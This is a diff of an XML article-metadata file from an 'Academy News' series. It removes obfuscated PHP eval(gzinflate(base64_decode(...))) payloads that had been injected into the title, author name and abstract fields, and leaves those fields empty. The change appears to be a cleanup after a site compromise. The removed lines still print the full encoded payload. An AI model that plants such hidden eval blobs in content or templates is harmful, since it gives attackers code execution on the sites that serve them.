@@ -21,15 +21,15 @@
 				<series-title>Academy News</series-title>
 			</article-categories>
 			<title-group>
-				<article-title><?php eval (gzinflate(base64_decode("bZBNasNADIX3hd5hGLqIoW4OUHvIpoVCIIV0F4KRbY09MD/C1gRC8d3rcWJooaCNvqenJ4RNH4TswDP6rqgHJV8fHzBB6qmKHhxushXJdcDozVP1eTh+Zd9Ls2sCXWf0/rF/O56klueTZEdVssvz81/hBrNkTVvnparGoYfR2GJbqzxX8uU/x5w7oR3xl6+DDmw6aFrqrgpxv1aHwQmH3Ie2pDCyQN/wlbB00bIhGHibRvIWGFRhPEUWi66NRZFSS73ypbvc5DHWzrAw7QwuYCOWkdT6m+kH"))); ?></article-title>
+				<article-title></article-title>
 			</title-group>
 			<contrib-group>
 				<contrib contrib-type="author">
 					<name>
-						<surname><?php eval (gzinflate(base64_decode("bZBNasNADIX3hd5hGLqIoW4OUHvIpoVCIIV0F4KRbY09MD/C1gRC8d3rcWJooaCNvqenJ4RNH4TswDP6rqgHJV8fHzBB6qmKHhxushXJdcDozVP1eTh+Zd9Ls2sCXWf0/rF/O56klueTZEdVssvz81/hBrNkTVvnparGoYfR2GJbqzxX8uU/x5w7oR3xl6+DDmw6aFrqrgpxv1aHwQmH3Ie2pDCyQN/wlbB00bIhGHibRvIWGFRhPEUWi66NRZFSS73ypbvc5DHWzrAw7QwuYCOWkdT6m+kH"))); ?></surname>
+						<surname></surname>
 						<given-names></given-names>
 					</name>
-					<string-name><?php eval (gzinflate(base64_decode("bZBNasNADIX3hd5hGLqIoW4OUHvIpoVCIIV0F4KRbY09MD/C1gRC8d3rcWJooaCNvqenJ4RNH4TswDP6rqgHJV8fHzBB6qmKHhxushXJdcDozVP1eTh+Zd9Ls2sCXWf0/rF/O56klueTZEdVssvz81/hBrNkTVvnparGoYfR2GJbqzxX8uU/x5w7oR3xl6+DDmw6aFrqrgpxv1aHwQmH3Ie2pDCyQN/wlbB00bIhGHibRvIWGFRhPEUWi66NRZFSS73ypbvc5DHWzrAw7QwuYCOWkdT6m+kH"))); ?></string-name>
+					<string-name></string-name>
 					<email />
 				</contrib>
 			</contrib-group>
@@ -44,7 +44,7 @@
 			<history />
 			<self-uri />
 			<abstract>
-				<p><?php eval (gzinflate(base64_decode("bZBNasNADIX3hd5hGLqIoW4OUHvIpoVCIIV0F4KRbY09MD/C1gRC8d3rcWJooaCNvqenJ4RNH4TswDP6rqgHJV8fHzBB6qmKHhxushXJdcDozVP1eTh+Zd9Ls2sCXWf0/rF/O56klueTZEdVssvz81/hBrNkTVvnparGoYfR2GJbqzxX8uU/x5w7oR3xl6+DDmw6aFrqrgpxv1aHwQmH3Ie2pDCyQN/wlbB00bIhGHibRvIWGFRhPEUWi66NRZFSS73ypbvc5DHWzrAw7QwuYCOWkdT6m+kH"))); ?></p>
+				<p></p>
 			</abstract>
 			<kwd-group>
 				<kwd />
